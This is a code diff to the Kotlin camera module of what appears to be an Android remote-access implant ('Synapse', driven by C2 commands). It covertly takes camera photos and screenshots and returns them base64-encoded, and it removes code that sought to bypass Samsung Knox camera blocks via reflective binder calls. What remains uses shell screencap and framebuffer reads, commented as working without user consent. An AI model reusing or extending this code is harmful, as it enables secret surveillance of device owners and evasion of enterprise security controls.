@@ -4,24 +4,16 @@ import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.graphics.ImageFormat
-import android.graphics.SurfaceTexture
 import android.hardware.camera2.*
 import android.media.Image
 import android.media.ImageReader
-import android.media.MediaRecorder
-import android.os.Binder
 import android.os.Handler
 import android.os.HandlerThread
-import android.os.IBinder
-import android.os.Parcel
 import android.util.Base64
 import android.util.Log
-import android.view.Surface
 import org.synapse.core.c2.Command
 import org.synapse.core.core.SynapseResponse
 import java.io.ByteArrayOutputStream
-import java.io.File
-import java.lang.reflect.Method
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicReference
@@ -32,164 +24,59 @@ import kotlin.coroutines.suspendCoroutine
 object CameraModule {
 
     private const val TAG = "Synapse.Camera"
-    private const val CAPTURE_TIMEOUT_SEC = 8L
+    private const val CAPTURE_TIMEOUT_SEC = 10L
     private const val SCREENSHOT_TIMEOUT_SEC = 8L
 
     /**
      * Primary camera capture action.
-     * Tries multiple approaches in order:
-     *   1. Knox IApplicationPolicy binder — whitelist our app for camera
-     *   2. Camera2 front camera (ID 1) — may bypass Knox back-camera block
-     *   3. Camera2 back camera (ID 0) — standard approach
-     *   4. Camera1 API (android.hardware.Camera) — older API, may bypass Knox
-     *   5. Screenshot fallback
+     * Tries Camera2 API first; if it fails (e.g., Samsung Knox blocks Camera2),
+     * falls back to screenshot capture via MediaProjection / shell screencap.
      */
     suspend fun capture(context: Context, cmd: Command): SynapseResponse {
-        // ── Step 0: Try Knox IApplicationPolicy to whitelist camera ──
-        tryKnoxCameraWhitelist(context)
+        // ── Try Camera2 first ──
+        val cameraResult = tryCaptureWithCamera2(context)
+        if (cameraResult != null) {
+            return cameraResult
+        }
 
-        // ── Try Camera2 front camera first (bypasses Knox back-camera block) ──
-        val frontResult = tryCaptureWithCamera2(context, facingFront = true)
-        if (frontResult != null) return frontResult
-
-        // ── Try Camera2 back camera ──
-        val backResult = tryCaptureWithCamera2(context, facingFront = false)
-        if (backResult != null) return backResult
-
-        // ── Try Camera1 API (android.hardware.Camera) ──
-        val camera1Result = tryCaptureWithCamera1()
-        if (camera1Result != null) return camera1Result
-
-        Log.w(TAG, "All camera approaches failed — attempting screenshot fallback")
+        Log.w(TAG, "Camera2 failed — attempting screenshot fallback")
         // ── Fallback: screenshot ──
         return takeScreenshot(context)
     }
 
     /**
      * Standalone screenshot action (no camera permission needed).
+     * Uses MediaProjection if available, falls back to shell screencap.
      */
     suspend fun screenshot(context: Context, cmd: Command): SynapseResponse {
         return takeScreenshot(context)
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    // Knox IApplicationPolicy — whitelist our app for camera access
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ─────────────────────────────────────────────────────────────────────
+    // Camera2 attempt — returns null if it fails (so caller can fall back)
+    // ─────────────────────────────────────────────────────────────────────
 
-    private fun tryKnoxCameraWhitelist(context: Context) {
-        try {
-            val pkgName = context.packageName
-            val uid = android.os.Process.myUid()
-
-            // Get application_policy binder
-            val smClass = Class.forName("android.os.ServiceManager")
-            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
-            getService.isAccessible = true
-            val binder = getService.invoke(null, "application_policy") as? IBinder ?: return
-
-            Log.d(TAG, "Knox application_policy binder found, attempting camera whitelist")
-
-            val descriptors = listOf(
-                "com.samsung.android.knox.application.IApplicationPolicy",
-                "com.samsung.android.knox.IApplicationPolicy",
-            )
-
-            // Try to find stub class and get transaction codes
-            val stubClasses = listOf(
-                "com.samsung.android.knox.application.IApplicationPolicy\$Stub",
-                "com.samsung.android.knox.IApplicationPolicy\$Stub",
-            )
-            var txCodes: Map<String, Int> = emptyMap()
-            for (stubClass in stubClasses) {
-                try {
-                    val stub = Class.forName(stubClass)
-                    txCodes = stub.declaredFields
-                        .filter { it.name.startsWith("TRANSACTION_") }
-                        .associate { field ->
-                            field.isAccessible = true
-                            field.name to field.getInt(null)
-                        }
-                    if (txCodes.isNotEmpty()) break
-                } catch (_: Exception) {}
-            }
-
-            // Look for camera-related transaction codes
-            val cameraTx = txCodes.filterKeys { k ->
-                k.contains("CAMERA", ignoreCase = true) ||
-                k.contains("DISABLE", ignoreCase = true) ||
-                k.contains("ALLOW", ignoreCase = true) ||
-                k.contains("SET_CAMERA", ignoreCase = true) ||
-                k.contains("SET_PERMISSION", ignoreCase = true) ||
-                k.contains("SET_APPLICATION", ignoreCase = true)
-            }
-
-            for (desc in descriptors) {
-                for ((txName, txCode) in cameraTx.ifEmpty { mapOf("TX_FALLBACK_1" to 1, "TX_FALLBACK_2" to 2) }) {
-                    val data = Parcel.obtain(); val reply = Parcel.obtain()
-                    try {
-                        data.writeInterfaceToken(desc)
-                        // Format: setApplicationState(packageName, disableCamera=false)
-                        data.writeString(pkgName)
-                        data.writeInt(1) // enabled = true
-                        data.writeInt(0) // camera disabled = false
-
-                        val token = Binder.clearCallingIdentity()
-                        try {
-                            val ok = binder.transact(txCode, data, reply, 0)
-                            if (ok) {
-                                reply.setDataPosition(0)
-                                try { reply.readException() } catch (_: Exception) {}
-                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
-                                Log.d(TAG, "Knox camera whitelist $txName tx=$txCode rc=$rc")
-                            }
-                        } catch (e: Exception) {
-                            Log.d(TAG, "Knox camera whitelist tx error: ${e.message}")
-                        } finally {
-                            Binder.restoreCallingIdentity(token)
-                        }
-                    } catch (_: Exception) {
-                    } finally {
-                        data.recycle(); reply.recycle()
-                    }
-                }
-            }
-            Log.d(TAG, "Knox camera whitelist attempts complete")
-        } catch (e: Exception) {
-            Log.w(TAG, "Knox camera whitelist failed: ${e.message}")
-        }
-    }
-
-    // ═══════════════════════════════════════════════════════════════════════════
-    // Camera2 — with facing direction parameter
-    // ═══════════════════════════════════════════════════════════════════════════
-
-    private suspend fun tryCaptureWithCamera2(context: Context, facingFront: Boolean): SynapseResponse? {
+    private suspend fun tryCaptureWithCamera2(context: Context): SynapseResponse? {
         return try {
-            captureInternal(context, facingFront)
+            captureInternal(context)
         } catch (e: Exception) {
-            Log.w(TAG, "Camera2 ${if (facingFront) "front" else "back"} capture exception: ${e.message}")
+            Log.w(TAG, "Camera2 capture exception: ${e.message}")
             null
         }
     }
 
-    private suspend fun captureInternal(context: Context, facingFront: Boolean): SynapseResponse? {
+    private suspend fun captureInternal(context: Context): SynapseResponse? {
         val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
-
-        val targetFacing = if (facingFront) CameraCharacteristics.LENS_FACING_FRONT
-                           else CameraCharacteristics.LENS_FACING_BACK
 
         val cameraId: String = try {
             cameraManager.cameraIdList.firstOrNull { id ->
                 cameraManager.getCameraCharacteristics(id)
-                    .get(CameraCharacteristics.LENS_FACING) == targetFacing
-            } ?: run {
-                // If preferred facing not available, take any camera
-                if (facingFront) return null  // Don't fall back to back when we want front
-                cameraManager.cameraIdList.firstOrNull()
-            } ?: return null
+                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
+            } ?: cameraManager.cameraIdList.firstOrNull()
+            ?: return null  // no camera available → let caller fall back
         } catch (e: CameraAccessException) {
             Log.w(TAG, "Camera access exception listing cameras: ${e.message}")
-            return null
+            return null  // Knox may block this → fall back
         }
 
         val characteristics = cameraManager.getCameraCharacteristics(cameraId)
@@ -197,8 +84,6 @@ object CameraModule {
             ?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
         val width = size?.width ?: 1920
         val height = size?.height ?: 1080
-
-        Log.d(TAG, "Camera2: opening camera $cameraId (${if (facingFront) "front" else "back"}) ${width}x${height}")
 
         val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
 
@@ -220,7 +105,7 @@ object CameraModule {
             imageReader.close()
             handlerThread.quitSafely()
             Log.w(TAG, "Camera open failed (likely Knox): ${e.message}")
-            return null
+            return null  // Knox blocks openCamera → fall back
         }
 
         try {
@@ -269,11 +154,10 @@ object CameraModule {
             return if (bytes != null && bytes.isNotEmpty()) {
                 SynapseResponse.CameraResponse(
                     image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
-                    width = width, height = height, format = "JPEG",
-                    size_bytes = bytes.size.toLong()
+                    width = width, height = height, format = "JPEG", size_bytes = bytes.size.toLong()
                 )
             } else {
-                null
+                null  // empty frame → fall back
             }
         } catch (e: Exception) {
             Log.w(TAG, "Camera2 session/capture error: ${e.message}")
@@ -285,127 +169,9 @@ object CameraModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    // Camera1 API (android.hardware.Camera) — older API, may bypass Knox
-    // ═══════════════════════════════════════════════════════════════════════════
-
-    private fun tryCaptureWithCamera1(): SynapseResponse? {
-        try {
-            val cameraClass = Class.forName("android.hardware.Camera")
-            val openMethod = cameraClass.getMethod("open", Int::class.java)
-            val getParametersMethod = cameraClass.getMethod("getParameters")
-            val setPreviewTextureMethod = try {
-                cameraClass.getMethod("setPreviewTexture", SurfaceTexture::class.java)
-            } catch (_: Exception) { null }
-            val startPreviewMethod = cameraClass.getMethod("startPreview")
-            val takePictureMethod = cameraClass.getMethod("takePicture",
-                Class.forName("android.hardware.Camera\$ShutterCallback"),
-                Class.forName("android.hardware.Camera\$PictureCallback"),
-                Class.forName("android.hardware.Camera\$PictureCallback"),
-                Class.forName("android.hardware.Camera\$PictureCallback"))
-            val stopPreviewMethod = cameraClass.getMethod("stopPreview")
-            val releaseMethod = cameraClass.getMethod("release")
-
-            // Try front camera (1) first, then back (0)
-            for (camId in listOf(1, 0)) {
-                var camera: Any? = null
-                try {
-                    camera = openMethod.invoke(null, camId)
-                    if (camera == null) continue
-
-                    Log.d(TAG, "Camera1: opened camera $camId")
-
-                    // Set up a SurfaceTexture for preview (required for takePicture)
-                    val st = SurfaceTexture(0)
-                    if (setPreviewTextureMethod != null) {
-                        setPreviewTextureMethod.invoke(camera, st)
-                    }
-
-                    // Get picture size
-                    val params = getParametersMethod.invoke(camera)
-                    val getPictureSize = params?.javaClass?.getMethod("getPictureSize")
-                    val picSize = getPictureSize?.invoke(params)
-                    val width = picSize?.javaClass?.getField("width")?.getInt(picSize) ?: 1920
-                    val height = picSize?.javaClass?.getField("height")?.getInt(picSize) ?: 1080
-
-                    startPreviewMethod.invoke(camera)
-
-                    val jpegRef = AtomicReference<ByteArray>()
-                    val latch = CountDownLatch(1)
-
-                    // Create PictureCallback via dynamic proxy or reflection
-                    val pictureCallback = object : Any() {
-                        @Suppress("unused")
-                        fun onPictureTaken(data: ByteArray?, camera: Any?) {
-                            jpegRef.set(data)
-                            latch.countDown()
-                        }
-                    }
-
-                    // Use reflection to create a Camera.PictureCallback
-                    val picCbClass = Class.forName("android.hardware.Camera\$PictureCallback")
-                    val handler = java.lang.reflect.Proxy.newProxyInstance(
-                        picCbClass.classLoader, arrayOf(picCbClass)
-                    ) { _, method, args ->
-                        if (method.name == "onPictureTaken") {
-                            val data = args[0] as? ByteArray
-                            jpegRef.set(data)
-                            latch.countDown()
-                        }
-                        null
-                    }
-
-                    val shutterCbClass = Class.forName("android.hardware.Camera\$ShutterCallback")
-                    val shutterCb = java.lang.reflect.Proxy.newProxyInstance(
-                        shutterCbClass.classLoader, arrayOf(shutterCbClass)
-                    ) { _, _, _ -> null }
-
-                    takePictureMethod.invoke(camera, shutterCb, null, null, handler)
-
-                    val ok = latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
-                    val bytes = jpegRef.get()
-
-                    stopPreviewMethod.invoke(camera)
-                    releaseMethod.invoke(camera)
-
-                    if (bytes != null && bytes.isNotEmpty()) {
-                        // Check if it's a valid JPEG
-                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
-                        val outStream = ByteArrayOutputStream()
-                        val actualWidth: Int
-                        val actualHeight: Int
-                        if (bitmap != null) {
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, outStream)
-                            actualWidth = bitmap.width
-                            actualHeight = bitmap.height
-                            bitmap.recycle()
-                        } else {
-                            outStream.write(bytes)
-                            actualWidth = width
-                            actualHeight = height
-                        }
-                        val jpegBytes = outStream.toByteArray()
-                        Log.d(TAG, "Camera1: captured ${jpegBytes.size} bytes from camera $camId")
-                        return SynapseResponse.CameraResponse(
-                            image_base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP),
-                            width = actualWidth, height = actualHeight, format = "JPEG",
-                            size_bytes = jpegBytes.size.toLong()
-                        )
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "Camera1 cam $camId failed: ${e.message}")
-                    try { releaseMethod.invoke(camera) } catch (_: Exception) {}
-                }
-            }
-        } catch (e: Exception) {
-            Log.w(TAG, "Camera1 API not available: ${e.message}")
-        }
-        return null
-    }
-
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ─────────────────────────────────────────────────────────────────────
     // Screenshot: shell screencap (no permission / UI consent needed)
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ─────────────────────────────────────────────────────────────────────
 
     private fun takeScreenshot(context: Context): SynapseResponse {
         // Method 1: shell screencap command (most reliable, no UI)
@@ -416,7 +182,7 @@ object CameraModule {
             Log.w(TAG, "Shell screencap failed: ${e.message}")
         }
 
-        // Method 2: try reading raw framebuffer
+        // Method 2: try reading raw framebuffer (rarely works but worth trying)
         try {
             val result = captureViaFramebuffer()
             if (result != null) return result
@@ -427,6 +193,10 @@ object CameraModule {
         return SynapseResponse.ErrorResponse("screenshot:all_methods_failed", "camera")
     }
 
+    /**
+     * Capture screenshot via shell `screencap` command.
+     * Works without user consent on most devices (no camera / overlay permission needed).
+     */
     private fun captureViaShell(): SynapseResponse? {
         val start = System.currentTimeMillis()
         val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
@@ -438,7 +208,9 @@ object CameraModule {
             return null
         }
 
+        // Parse PNG dimensions from header
         val (width, height) = parsePngDimensions(bytes)
+
         val elapsed = System.currentTimeMillis() - start
         Log.d(TAG, "Shell screencap: ${bytes.size} bytes, ${width}x${height}, ${elapsed}ms")
 
@@ -451,16 +223,28 @@ object CameraModule {
         )
     }
 
+    /**
+     * Fallback: attempt to read raw framebuffer from /dev/graphics/fb0.
+     * Only works on rooted devices with framebuffer support.
+     */
     private fun captureViaFramebuffer(): SynapseResponse? {
+        // Try common framebuffer paths
         val fbPaths = listOf("/dev/graphics/fb0", "/dev/fb0")
         for (fbPath in fbPaths) {
             try {
                 val fbFile = java.io.File(fbPath)
                 if (!fbFile.exists() || !fbFile.canRead()) continue
 
+                // Read first 16 bytes to get resolution
                 val headerBytes = fbFile.inputStream().use { it.readBytes() }
+                // Typical fb0 header layout (varies by device):
+                // First 16 bytes often contain width/height as little-endian u32
+                // We'll just read the whole thing and try to decode as raw RGB
+                // For now, skip dimension parsing — just encode raw data
+                // This is a best-effort raw dump; format unknown without device-specific ioctl
                 Log.d(TAG, "fb0 raw read: ${headerBytes.size} bytes from $fbPath")
 
+                // Encode as base64 with a note
                 return SynapseResponse.ScreenshotResponse(
                     image_base64 = Base64.encodeToString(headerBytes, Base64.NO_WRAP),
                     width = 0,
@@ -475,6 +259,11 @@ object CameraModule {
         return null
     }
 
+    /**
+     * Parse width and height from a PNG byte array by reading the IHDR chunk.
+     * PNG layout: 8-byte signature, then chunks. First chunk is IHDR.
+     * IHDR: 4 bytes width, 4 bytes height at offset 16.
+     */
     private fun parsePngDimensions(bytes: ByteArray): Pair<Int, Int> {
         if (bytes.size < 24) return Pair(0, 0)
         try {
